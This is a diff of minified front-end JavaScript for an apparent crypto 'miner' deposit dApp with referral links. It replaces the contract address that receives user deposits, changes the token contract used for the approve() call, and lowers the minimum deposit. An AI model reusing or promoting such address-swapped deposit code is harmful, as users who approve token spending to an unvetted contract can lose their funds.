@@ -29,7 +29,7 @@
 				m = (n(191), n(4)),
 				x = i.a.createContext();
 			"undefined" !== typeof window && (a = window.ethereum);
-			var h = "0x5B101B053969E85299649FC3427C6d35582C9859",
+			var h = "0xb356d32f30A99759961c631dd2053fA9Dc92a2B8",
 				O = function() {
 					var e = new f.a.providers.Web3Provider(a);
 					e.getSigner();
@@ -349,11 +349,11 @@
 								return Object(p.a)().wrap((function(e) {
 									for (;;) switch (e.prev = e.next) {
 										case 0:
-											if (t.preventDefault(), r = t.target.bnbval.value, 1, !(r >= 10 && r <= 1e5)) {
+											if (t.preventDefault(), r = t.target.bnbval.value, 1, !(r >= 1 && r <= 1e5)) {
 												e.next = 28;
 												break
 											}
-											return i = new f.a.providers.Web3Provider(a), c = i.getSigner(), u = new f.a.Contract(h, y, c), o = new f.a.Contract("0xcDaDB1D9ae238dB553aB88A7c5356F4b518C76Cb", j, c), console.log("sending " + t.target.bnbval.value + " to the contract"), d = f.a.utils.parseEther(t.target.bnbval.value), e.next = 12, o.approve(h, d);
+											return i = new f.a.providers.Web3Provider(a), c = i.getSigner(), u = new f.a.Contract(h, y, c), o = new f.a.Contract("0x55d398326f99059fF775485246999027B3197955", j, c), console.log("sending " + t.target.bnbval.value + " to the contract"), d = f.a.utils.parseEther(t.target.bnbval.value), e.next = 12, o.approve(h, d);
 										case 12:
 											return b = e.sent, l(!0), console.log(b), e.next = 17, b.wait();
 										case 17:
@@ -625,7 +625,7 @@
 						T = new URLSearchParams(A).get("ref") || "0x0000000000000000000000000000000000000000",
 						k = "https://yutuminer.netlify.app/?ref=",
 						B = (k.concat(T), k.concat(j)),
-						M = "0x5B101B053969E85299649FC3427C6d35582C9859",
+						M = "0xb356d32f30A99759961c631dd2053fA9Dc92a2B8",
 						S = Object(r.useState)(null),
 						N = Object(u.a)(S, 2),
 						E = N[0],
